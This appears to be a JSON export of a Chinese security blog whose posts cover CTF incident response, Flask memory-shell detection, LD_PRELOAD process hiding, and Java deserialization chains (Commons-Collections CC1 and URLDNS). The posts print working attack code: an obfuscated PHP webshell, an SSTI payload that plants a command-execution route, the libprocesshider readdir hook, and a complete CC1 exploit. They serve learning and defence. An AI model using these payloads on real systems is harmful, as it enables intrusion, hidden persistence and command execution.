{"meta":{"title":"Polo's Blog","subtitle":null,"description":null,"author":"Polo","url":"https://polosec.github.io","root":"/"},"pages":[{"title":"关于我","date":"2020-03-06T03:42:37.000Z","updated":"2021-01-26T10:01:42.000Z","comments":true,"path":"about/index.html","permalink":"https://polosec.github.io/about/index.html","excerpt":"","text":"ab4o/polo研究兴趣：红蓝对抗/内网渗透/ctf-web/流量分析/取证专业：网络空间安全"},{"title":"archives","date":"2020-03-06T03:42:54.000Z","updated":"2020-03-06T11:44:30.000Z","comments":true,"path":"archives/index.html","permalink":"https://polosec.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-03-06T03:42:46.000Z","updated":"2020-03-06T11:43:55.000Z","comments":true,"path":"categories/index.html","permalink":"https://polosec.github.io/categories/index.html","excerpt":"","text":""},{"title":"Search","date":"2021-04-23T15:53:40.000Z","updated":"2021-04-23T15:55:37.000Z","comments":true,"path":"search/index.html","permalink":"https://polosec.github.io/search/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-03-06T03:40:43.000Z","updated":"2020-03-06T11:43:14.000Z","comments":true,"path":"tags/index.html","permalink":"https://polosec.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"BUGKU PAR 应急加固","slug":"BUGKU-PAR-应急加固","date":"2022-10-16T12:30:17.000Z","updated":"2022-10-17T02:49:46.663Z","comments":true,"path":"2022/10/16/BUGKU-PAR-应急加固/","link":"","permalink":"https://polosec.github.io/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/","excerpt":"","text":"js劫持点开之后发现有个URL跳转，跳转到了博客，所以劫持后的URL是 https://www.194nb.com 首次webshellssh上去直接看/var/www/html目录，找类似Upload的文件夹 直接找到webshell 首次攻击方式使用命令 1cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log |cut -d &quot; &quot; -f 1 |sort |uniq -c |sort -nr |head -n 10 获得访问前10的ip地址（nginx） apache如下 123cat access_log|awk &#x27;&#123;print $1&#125;&#x27;|sort|uniq-c|sort -nr|head -10注意awk &#x27;&#123;print$1&#x27;，它表示取日志的第一段，如果换成别的日志，其IP地址在第3段那么就要改变相应数值。 IP地址123.139.39.161明显异常，利用工具查看其动作 利用日志分析工具 https://security.tencent.com/index.php/opensource/detail/15 scp上传服务器 可以看到某个ip地址访问的URL，但是从这里没有看出异常，除了1.php。 先手动看一下nginx日志，grep上述地址 可以看到/sale/api这里有一个xss的payload，交一下试试,小写xss正确 黑客服务器信息看下进程和端口 lsof看到80端口有/dev/null字样，可能有异常，但是不能确定是什么问题 ps aux 看到有运行的脚本文件 一个反弹shell ip地址49.232.241.253:8888 黑客webshell2刚才logforensics找到的1.php看一眼 这个文件用D盾和河马是杀不出来的，所以免杀马++ 1&lt;?php $aa=_GET;@array_map(implode(&#x27;&#x27;,[&#x27;a&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;t&#x27;]),$$aa); ?&gt; mysqlmysql&gt; revoke file on . from ‘root’@’localhost’; mysql&gt; set global general_log=’off’; flush privileges; mysql更新密码：mysql&gt; set password for root@localhost =password(‘12345678’) mysql备份数据库 mysqldump -u root -p12345678 –all-databases &gt;1.sql mysql还原数据库 mysql -u root -p &lt;1.sql 黑客账号cat /etc/passwd cat /etc/shadow 发现账号aman并且删除 黑客篡改命令1和2看一下bin目录的ls 有个ls和ls2，file一下 ls有问题 修复一下 发现ps也有问题 一样地，ps隐藏了某个进程 rm -rf ps mv ps_ ps JS劫持修复1find . | xargs grep -ri &#x27;&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c 把最后一个script标签删掉就好了","categories":[],"tags":[{"name":"rdg","slug":"rdg","permalink":"https://polosec.github.io/tags/rdg/"}]},{"title":"Flask内存马的检测与清除","slug":"Flask内存马的检测与清除","date":"2022-10-15T16:59:21.000Z","updated":"2022-10-15T16:59:56.482Z","comments":true,"path":"2022/10/16/Flask内存马的检测与清除/","link":"","permalink":"https://polosec.github.io/2022/10/16/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%B8%85%E9%99%A4/","excerpt":"","text":"Demo12345678910111213141516from flask import Flask, request, render_template_string,current_appapp = Flask(__name__)@app.route(&#x27;/&#x27;)def hello_world(): # put application&#x27;s code here person = &#x27;knave&#x27; if request.args.get(&#x27;name&#x27;): person = request.args.get(&#x27;name&#x27;) template = &#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27; % person return render_template_string(template)if __name__ == &#x27;__main__&#x27;: app.run() Flask 内存马生成1url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;) Flask内存马检测情景1 代码自带内存马 类似于这种直接执行命令的，再复杂一点的base64编码之类的，看到之后直接清除掉即可。 情景2 通过ssti种植内存马12url_for.__globals__[&#x27;current_app&#x27;].url_map打印当前所有路由，可用来结合流量观察是否有内存马 rule的意思是通过URL访问的地址，如/shell，后面-&gt;跟的是entrypoint，可以理解为处理到达该请求的函数是什么，比如rule ‘/‘的entrypoint是hello_world,那么当访问首页的时候就会转到函数hello_world去进行处理。 flask内存马清除修改源代码，新建一个同名路由（如/shell），即可抵消新写入路由的影响，并且修复ssti，只需要过滤花括号就可以了。 123456789101112131415161718192021from flask import Flask, request, render_template_string,current_appapp = Flask(__name__)@app.route(&#x27;/&#x27;)def hello_world(): # put application&#x27;s code here person = &#x27;knave&#x27; blacklist=&#x27;&#123;&#x27;#彻底杜绝ssti if request.args.get(&#x27;name&#x27;): person = request.args.get(&#x27;name&#x27;) if blacklist in person:#关键字检测 return &quot;fxxk hacker&quot; template = &#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27; % person return render_template_string(template)@app.route(&#x27;/shell&#x27;)def test(): return &quot;123&quot;if __name__ == &#x27;__main__&#x27;: app.run() 再次使用payload打一下，情况如下 参考https://xz.aliyun.com/t/10933#toc-4 https://www.anquanke.com/post/id/279160#h3-11","categories":[],"tags":[{"name":"awd","slug":"awd","permalink":"https://polosec.github.io/tags/awd/"},{"name":"rdg","slug":"rdg","permalink":"https://polosec.github.io/tags/rdg/"}]},{"title":"实景防御赛Linux库文件劫持技术浅析","slug":"实景防御赛Linux库文件劫持技术浅析","date":"2022-10-10T14:24:44.000Z","updated":"2022-10-12T04:35:07.438Z","comments":true,"path":"2022/10/10/实景防御赛Linux库文件劫持技术浅析/","link":"","permalink":"https://polosec.github.io/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/","excerpt":"","text":"写在前面很久没写博客了，感觉已经摆烂了很久，所以今天下定决心要把之前遇到的一个点解决掉。 去年打广东省强网杯决赛的时候上午算是安全运维赛，遇到了一道题，和Linux库文件劫持有关，于是趁此机会把这个点讲清楚，也算是问了后面网鼎杯半决赛的RDG（实景防御）复习开个好头。 Linux库文件在讲库文件劫持之前需要了解Linux的库文件到底是什么。Linux的库文件分为动态库和静态库。 对于静态库文件来说，所有代码在编译的时候就会被加载，因此可执行程序体积较大。 本次主要讨论动态库，在编译时引入动态库(so)并不会将动态库中的代码编译到可执行程序中，而是在可执行程序中记录了对so文件的引用，当执行时，才会去加载so文件，以节省内存空间。 动态库文件加载顺序 gcc 编译时指定的运行时库路径 -Wl,-rpath 环境变量 LD_LIBRARY_PATH ldconfig 缓存 /etc/ld.so.cache 系统默认库位置 /lib /usr/lib 第一个Linux动态库demo为了模拟赛时场景，需要写一个so文件并且调用，先写一个最简单的demo，后面再将赛时场景加入。 当前有三个文件，分别是main.c add.c add.h 内容分别如下 main.c: add.c: Add.h: add.c中定义了方法adds，返回a+b的值，add.h中给出了方法adds的声明 main.c中调用了adds方法并且输出值 生成so文件1gcc add.c -fPIC -shared -o libadd.so -fPIC是编译选项，PIC是 Position Independent Code 的缩写，表示要生成位置无关的代码，这是动态库需要的特性； -shared是链接选项，告诉gcc生成动态库而不是可执行文件。 1gcc main.c -L. -ladd -o main -ladd表示链接libadd.so文件 -L.表示搜索要链接的库文件时包含当前路径。 注意，如果同一目录下同时存在同名的动态库和静态库，比如 libadd.so 和 libadd.a 都在当前路径下， 则gcc会优先链接动态库。 最后生成的为main可执行文件 直接执行会报错，提示 ./main: error while loading shared libraries: libadd.so: cannot open shared object file: No such file or directory 出现这个错误的原因是没有找到libadd.so文件，原来Linux是通过 /etc/ld.so.cache 文件搜寻要链接的动态库的。 而 /etc/ld.so.cache 是 ldconfig 程序读取 /etc/ld.so.conf 文件生成的。 所以，需要修改/etc/ld.so.conf文件内容，添加so文件的路径，并且使用ldconfig命令更新。 ldd与nm命令ldd命令可以查看一个可执行程序依赖的共享库,比如刚才写的libadd.so nm命令 查看一个库中到底有哪些函数，nm命令可以打印出库中的涉及到的所有符号。 strace命令strace命令用于跟踪系统调用，常用命令如下 1strace -o output.txt -T -tt -e trace&#x3D;all -p 28979 上面的含义是 跟踪28979进程的所有系统调用（-e trace=all），并统计系统调用的花费时间，以及开始时间（并以可视化的时分秒格式显示），最后将记录结果存在output.txt文件里面。 通过strace可以看到调用了哪些动态链接库，例如下面给出的whoami的例子（后面一张图是截的别人的，自己的好像没有看到那么多库） 1strace /usr/bin/whoami 挖矿场景下的动态库劫持分析在处理过的挖矿事件中，挖矿程序通常会隐藏真实的挖矿进程，导致通过ps top等命令无法看到挖矿进程。 写一个类似的demo去模拟该场景,我自己服务器性能太差了 跑不动，就把socket连接换成了print ok 1234567891011121314151617#!/usr/bin/pythonimport socketimport sysdef send_traffic(ip, port): print &quot;Sending burst to &quot; + ip + &quot;:&quot; + str(port) #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #sock.connect((ip, port)) while True: # sock.send(&quot;I AM A BAD BOY&quot;) print(&quot;ok&quot;)if len(sys.argv) != 3: print &quot;Usage: &quot; + sys.argv[0] + &quot; IP PORT&quot; sys.exit() send_traffic(sys.argv[1], int(sys.argv[2])) Let’s go! python2 evil.py 1.1.1.1 8888 运行之后使用top命令和ps aux 可以看到所运行的进程 接下来挖矿程序的目的是隐藏该CPU/内存占用率过高的进程。 简单地说，ps命令是通过遍历/proc目录获取与进程相关的信息（pid status cmdline等） 进程隐藏方法alias命令alias ‘ps’=’ps aux | grep -v python’ 这里的python可以换成任意目标字符串或者获取到的pid 替换二进制文件默认ps的链接文件为 可以通过替换ps命令或者新建连接实现二进制文件替换/修改，如将ps删除，新上传一个恶意的ps，实现进程隐藏。 预加载(preloading)通过预加载，Linux给了我们一个选项，在其他正常的系统库被加载之前加载一个自定义共享库。这意味着，如果自定义库导出的函数与系统库中的函数名相同，我们就可以用我们库中的自定义代码覆盖它，而所有的进程都会自动选择我们的自定义函数) 例如，通过重写readdir()方法，在去去读/proc目录的时候，刻意隐藏某个进程。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;dlfcn.h&gt;#include &lt;dirent.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;/* * Every process with this name will be excluded */static const char* process_to_filter = &quot;evil.py&quot;;/* * Get a directory name given a DIR* handle */static int get_dir_name(DIR* dirp, char* buf, size_t size)&#123; int fd = dirfd(dirp); if(fd == -1) &#123; return 0; &#125; char tmp[64]; snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd); ssize_t ret = readlink(tmp, buf, size); if(ret == -1) &#123; return 0; &#125; buf[ret] = 0; return 1;&#125;/* * Get a process name given its pid */static int get_process_name(char* pid, char* buf)&#123; if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) &#123; return 0; &#125; char tmp[256]; snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid); FILE* f = fopen(tmp, &quot;r&quot;); if(f == NULL) &#123; return 0; &#125; if(fgets(tmp, sizeof(tmp), f) == NULL) &#123; fclose(f); return 0; &#125; fclose(f); int unused; sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf); return 1;&#125;#define DECLARE_READDIR(dirent, readdir) \\static struct dirent* (*original_##readdir)(DIR*) = NULL; \\ \\struct dirent* readdir(DIR *dirp) \\&#123; \\ if(original_##readdir == NULL) &#123; \\ original_##readdir = dlsym(RTLD_NEXT, #readdir); \\ if(original_##readdir == NULL) \\ &#123; \\ fprintf(stderr, &quot;Error in dlsym: %s\\n&quot;, dlerror()); \\ &#125; \\ &#125; \\ \\ struct dirent* dir; \\ \\ while(1) \\ &#123; \\ dir = original_##readdir(dirp); \\ if(dir) &#123; \\ char dir_name[256]; \\ char process_name[256]; \\ if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp; \\ strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp; \\ get_process_name(dir-&gt;d_name, process_name) &amp;&amp; \\ strcmp(process_name, process_to_filter) == 0) &#123; \\ continue; \\ &#125; \\ &#125; \\ break; \\ &#125; \\ return dir; \\&#125;DECLARE_READDIR(dirent64, readdir64);DECLARE_READDIR(dirent, readdir); repo:https://github.com/gianlucaborello/libprocesshider.git clone下来之后直接make，就可以生成so文件 使用预加载有几种方式： 1.LD_PRELOAD 环境变量LD_PRELOAD环境变量是会及时生效的，使用LD_PRELOAD加载恶意动态链接库方法如下： LD_PRELOAD=/lib/evil.so LD_PRELOAD的值设置为要预加载的动态链接库 export LD_PRELOAD 导出环境变量使该环境变量生效 unset LD_PRELOAD 解除设置的LD_PRELOAD环境变量 运行evil.so 并且通过ps查看 Unset LD_PRELOAD后再次通过ps查看 LD_PRELOAD不仅可以通过shell设置后然后export，还可以通过修改bash_profile 永久保存 2./etc/ld.so.preload文件/etc/ld.so.preload是一种全局性的修改，影响范围比第一种方式更大，可以在该文件中指定so文件，以预加载恶意so文件。 具体操作方法如下： 先看一下刚才执行evil.py时ps的结果，可以看到evil.py 现在再执行evil.py，查看ps aux的结果: 可以看到彻底隐藏了evil.py的进程. 当清空/etc/ld.preload中的内容后，可以看到进程又出现了 广东省强网杯Final-安全运维题目环境为Linux，当时状况如下： 1.netstat 出现疑似外连行为 2.ps aux发现反弹shell命令 3.通过lsof查看端口 进程信息 无收获 只能找到路径/root/qwb 赛时解比赛的时候做到这里实在是不知道怎么做了，实际上也没有找到运行的elf文件，最后随意翻了翻翻到了一个so文件，IDA打开之后看到内容就是反弹shell执行的命令，把so文件删掉之后这道题就算是patch了。 正确解场景1.可以找到可执行文件 通过ldd命令分析可执行文件所调用的动态库文件 这里可以看到有libqwb.so(或者其他奇奇怪怪的so文件名) 将该文件直接删除即可 场景2.找不到可执行文件（so文件不在/usr/lib 或者/lib下） 查看LD_PRELOAD环境变量，是否有可疑文件 查看/etc/ld.so.conf文件内容 是否有可疑路径 最终定位到tmp目录下的so文件，将其删除即可 参考本文所用demo均可在以下链接中找到 https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/ https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/ https://www.freebuf.com/column/162604.html https://www.freebuf.com/articles/system/223311.html","categories":[],"tags":[{"name":"awd","slug":"awd","permalink":"https://polosec.github.io/tags/awd/"},{"name":"rdg","slug":"rdg","permalink":"https://polosec.github.io/tags/rdg/"}]},{"title":"Ysoserial Commons-Collections 1分析","slug":"java-cc1分析","date":"2022-05-13T05:28:06.000Z","updated":"2022-07-26T03:33:49.000Z","comments":true,"path":"2022/05/13/java-cc1分析/","link":"","permalink":"https://polosec.github.io/2022/05/13/java-cc1%E5%88%86%E6%9E%90/","excerpt":"","text":"第一次分析cc链看了好几天，Java基础也不太好真的看吐了，基本所有知识都是从头开始学，感谢大哥支持解惑 什么是cc1Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发.而cc1就是利用common collections实现命令执行的一条调用链 java知识–Transformer接口TransformerTransformer是一个接口，任何implements它的类都要实现transform方法 ConstantTransformerConstantTransformer类是一个implements了transformer和serializable的类，也就意味着这个类可以序列化、反序列化。 ConstantTransformer重写的transform方法会返回一个常量对象，首先是public构造器保存到iConstant，然后transform方法返回iConstant常量 123Transformer transformer=new ConstantTransformer(Runtime.getRuntime()); Object o=transformer.transform(new Object()); System.out.println(o.getClass().getName()); 单纯看这个好像确实没啥用 InvokerTransformerInvokerTransformer算是cc1反序列化中比较重要的一个类了。 InvokerTransformer也是implements了transformer接口，看它的构造函数里面的参数内容可以看到非常像invoke方法所需要的 然后看它的transform怎么写的： 其实就是invoke的写法。先尝试把弹calc的反射代码通过InvokerTransformer写出来 123456InvokerTransformer it1=new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;); Method method1 = (Method) it1.transform(Runtime.class); InvokerTransformer it2=new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;); Runtime method2= (Runtime) it2.transform(method1); InvokerTransformer it3=new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;); it3.transform(method2); 其实写下来这几个InvokerTransformer之后我对invoke以及InvokerTransformer的构造方法了解更深一步，首先看第一行InvokerTransformer，目的是通过Class类的getmethod方法找到getRuntime方法，但是是谁的getRuntime方法呢？现在还没说。然后看构造方法传递的参数，第一个是方法名，第二个是class [] paramTypes,第三个是args，也就是说第一个参数是方法名，第二个参数是一个数组，数组内容是方法名（第一个参数传递的方法）参数的类型，第三个参数是实际要传递的参数。 在第二行调用完transform方法后，我们下断点调试看一下： 进到transform方法之后，由于传递的是Runtime.class，所以object input也就是runtime.class 这句话其实翻译过来就是找到Runtime下的getRuntime方法，后面的invoke也就是找到并返回这个方法 。 第二个transformer和transform的结果就是调用了getRuntime()方法，类似getRuntime.invoke(Runtime,null)，得到的是一个Runtime实例。 第三个transformer和transform的结果就是getRuntime().exec(xxx)，在transform方法中的形式是exec.invoke(Runtime,”calc”); 最终弹出来了计算器。 ChainedTransformer串连起来的transformer，分别调用各个transformer的transform方法，顺序调用。 因为Object是迭代的，所以说第一个transformer.transform()之后的object作为第二个transformer.transform()的输入。 将上面的InvokerTransformer转为ChainedTransformer写法： 123456789Transformer []transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer ct=new ChainedTransformer(transformers); ct.transform(Object.class); &#125; TransformedMapTransformedMap的某些方法可以调用到ChainedTransformer的transform方法。 Map.EntryMap的entrySet()方法返回一个实现Map.Entry接口的对象集合。集合中每个对象都是底层Map中一个特定的键/值对。通过这个集合的迭代器，获得每一个条目(唯一获取方式)的键或值并对值进行更改。 个人理解的话就是一个迭代器遍历map的每一个key/value对，通过Map.Entry entry对各个k/v进行getvalue、setvalue等操作。 debug一下setValue方法 继续跟进checksetvalue方法，有意思的来了，跟到了transformedMap类中的checkSetValue方法，返回的是**valueTransformer.transform(value)**，而valueTransformer正是我们传入的ChainedTransformer，那么是不是就跟到了ChainedTransformer的transform方法中呢？ 可以发现跟到了ChainedTransformer类中的transform方法。那么我们就可以使用TransformedMap类利用ChainedTransformer实现命令执行。 LazyMapLazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并继承 AbstractMapDecorator LazyMap 的漏洞触发点和 TransformedMap 唯一的差别是，TransformedMap 是在写入元素的时候执行 transform，而 LazyMap 是在其 get 方法中执行的 factory.transform 。其实这也好理解，LazyMap 的作用是“懒加载”，在 get 找不到值的时候，它会调用 factory.transform 方法去获取一个值。 下面尝试使用LazyMap进行命令执行 调试一下，跟进decorate方法 然后是get方法 get的意思是如果找不到key的话，则会调用factory的transform方法，factory是我们传入的ChainedTransformer。 那么在这个过程中就自动调用了ChainedTransformer.transform()方法，执行了我们想要的命令。 构造调用链目前知道的是通过ChainedTransformer的transform方法可以直接命令执行，但是肯定不能让服务器端手动执行的，目标是找到一个在反序列化过程中，通过某些中间调用过程一步步调用到ChainedTransformer.transform()方法，下面将一步步分析。 LazyMap.get()-&gt;ChainedTransformer.transform()上面在说lazyMap的时候已经提到了，这里再重复一下代码 12345678910Transformer []transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer ct=new ChainedTransformer(transformers);Map in=new HashMap(); Map out= LazyMap.decorate(in,ct); out.get(null); 这样通过lazyMap.get()方法可以命令执行了，下面需要找的是怎么能跳转到LazyMap.get()方法 AnnotationInvocationHandler.invoke()-&gt;LazyMap.get()AnnotationInvocationHandler implement了 InvocationHandler和Serializable接口，意味着它是一个调用处理器并且可以反序列化，重写了invoke()方法。 接下来看AnnotationInvocationHandler的invoke方法怎么写的： 注意看构造器中的membervalues是一个map，是我们可控的，同时invoke方法在检测到method.getName()不是toString、hashCode、annotationType时会调用memberValues的get方法，这正是我们需要找的利用点。现在需要做的是怎么才能到AnnotationInvocationHandler.invoke()这个方法？ AnnotationInvocationHandler.readObject()-&gt;memberValues.entrySet()-&gt;AnnotationInvocationHandler.invoke() 当调用动态代理代理对象的任意方法的时候，都会触发代理类重写的invoke方法,那么在AnnotationInvocationHandler.readObject()中调用了 memberValues.entrySet()方法，那么当前的memberValues也就是evilmap，调用了这个代理map的某个方法（**entrySet()），所以会转到代理类(AnnotationInvocationHandler)重写的invoke()**方法中去. 完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package ysoserial.test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class cc1Test &#123; public static void main(String[] args) throws Exception &#123; //构造transformer Transformer []transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer ct=new ChainedTransformer(transformers); //构造map Map in=new HashMap(); Map out= LazyMap.decorate(in,ct); //通过反射获取AnnotationInvocationHandler实例 Constructor ctr=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class); ctr.setAccessible(true); //构造反序列化需要用到的ChainedTransformer，放到map里面 InvocationHandler handler= (InvocationHandler) ctr.newInstance(Override.class,out); //代理类，用于触发反序列化 Map testmap=new HashMap(); Map evilmap= (Map) Proxy.newProxyInstance(testmap.getClass().getClassLoader(), testmap.getClass().getInterfaces(),handler); handler= (InvocationHandler) ctr.newInstance(Override.class, evilmap); //序列化与反序列化 byte[] serializeData=serialize(handler); unserialize(serializeData); &#125; public static byte[] serialize(final Object obj) throws Exception &#123; ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); &#125; public static Object unserialize(final byte[] serialized) throws Exception &#123; ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); return objIn.readObject(); &#125;&#125; 那么整体调用链如下： 12345678910111213141516ObjectInputStream.readObject()//服务器读取对象 AnnotationInvocationHandler.readObject()//转到AnnotationInvocationHandler对象的readObject()方法 Map(Proxy).entrySet()//用于触发代理类对象的invoke() AnnotationInvocationHandler.invoke() LazyMap.get()//用于触发memberValues.get(member) ChainedTransformer.transform()//层级调用进行命令执行 ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 参考https://www.freebuf.com/sectool/320360.html https://zhuanlan.zhihu.com/p/349838623 https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.337.search-card.all.click","categories":[],"tags":[],"author":"Polo"},{"title":"从0解析 ysoserial URLDNS链","slug":"从0解析-ysoserial-URLDNS链","date":"2022-05-07T15:52:55.000Z","updated":"2022-07-26T03:36:22.000Z","comments":true,"path":"2022/05/07/从0解析-ysoserial-URLDNS链/","link":"","permalink":"https://polosec.github.io/2022/05/07/%E4%BB%8E0%E8%A7%A3%E6%9E%90-ysoserial-URLDNS%E9%93%BE/","excerpt":"","text":"什么是ysoserialysoserial是一款Java反序列化利用工具，可以理解为payload生成器，而Java反序列化中的payload通常是一条利用链，叫做gadget chain，这就和PHP 反序列化构造利用链是类似的道理，如果了解过PHP 反序列化的话相信不是太难理解利用链的概念，再抽象一点，就像在Flask+jinja2模板注入中，通过变量到基类，然后从基类到子类一步一步找到执行系统命令/文件读取的函数，这也算得上是一种利用链。 ysoserial地址：https://github.com/frohoff/ysoserial （salute! 在ysoserial根据组件或者环境不同内置了数条利用链，其中urldns这条利用链使用的组件是Java原生的类与方法，应该适用于所有情况。 urldns链生成的payload执行后会产生一个dns query，如果在dnslog平台看到了该请求则可以认为存在Java反序列化漏洞。 部分Java基础知识在讲具体代码之前还需要说一下部分用到的Java知识 URLStreamHandler类抽象类URLStreamHandler是所有流协议处理程序的通用父类。流协议处理程序知道如何为特定协议类型（如http、ftp或gopher）建立连接。在大多数情况下，URLStreamHandler子类的实例不是由应用程序直接创建的。相反，在构造URL时第一次遇到协议名时，会自动加载相应的流协议处理程序。 URL类 可以理解为通过url类把一个字符串url处理成Java可以理解的url格式。 HashMap类Java中的Map是一个接口，不能实例化Map类，而是使用implemented Map的类，如hashmap，treemap。 map是key-value键值对，其中key是不可重复的，hashmap使用哈希算法对key去重，效率更高。 hashmap.put()hashmap.put()方法将一个k,v(key,value)放入hashmap实例中。 Field类Field 是一个类，位于 java.lang.reflect 包下。在 java 反射中 Field 类描述的是类的属性，功能包括: 获取当前对象的成员变量的类型 对成员变量重新设值 field.setAccessible(true)正常 set(Object obj, Object value) 时，修改 final 类型的变量会导致 IllegalAccessException。由于 Field 继承自 AccessibleObject，我们可以使用 AccessibleObject.setAccessible() 方法告诉安全机制，这个变量可以访问即可解决，如 field.setAccessible(true)。 getField getField() 方法，获取一个类的 public 成员变量，包括基类 getDeclaredField() 方法，获取一个类的 所有成员变量，不包括基类 set()Field类的set方法其实就有点反射的意思了，首先需要通过getDeclaredField方法获取某个属性，如 1Field hashcode&#x3D;u.getClass().getDeclaredField(&quot;hashCode&quot;); 然后将hashcode设置为可访问 1hashcode.setAccessible(true); 然后将hashcode的属性值设为某个值： 1hashcode.set(u,-1); 在这个过程中我认为有点invoke的感觉，正常设置某个属性的值应该是u.hashcode=-1。 使用reflection的话，通过**Reflections.setFieldValue(u, “hashCode”, -1);**也可以修改hashcode的值。 payload生成分析12345678910111213141516171819202122232425262728293031323334353637package ysoserial.test;import java.io.*;import java.lang.reflect.Field;import java.net.*;import java.util.HashMap;public class URLDNStest implements Serializable &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123; /* URLStreamHandler handler= new URLStreamHandler() &#123; @Override protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; protected synchronized InetAddress getHostAddress(URL u) &#123; return null; &#125;先不管这部分代码，后面会解释 &#125;;*/ HashMap ht=new HashMap(); String url=&quot;http://test.5.0x4.cc&quot;; URL u=new URL(null,url,handler); ht.put(u,url); Field hashcode=u.getClass().getDeclaredField(&quot;hashCode&quot;); hashcode.setAccessible(true); hashcode.set(u,-1); ObjectOutputStream stream = new ObjectOutputStream(new FileOutputStream(&quot;D:\\\\javaVulnsStu\\\\ysoserial\\\\test.data&quot;)); stream.writeObject(ht); //反序列化生成的payload ObjectInputStream stream1 = new ObjectInputStream(new FileInputStream(&quot;D:\\\\javaVulnsStu\\\\ysoserial\\\\test.data&quot;)); stream1.readObject(); &#125;&#125; 在**ht.put(u,url)处下断点调试，首先跟到的是putval()**方法 接下来跟到了HashMap.java的hash()方法，发现调用了hashcode()方法，继续跟进hashcode()方法发现到了URL.JAVA的hashcode()方法中 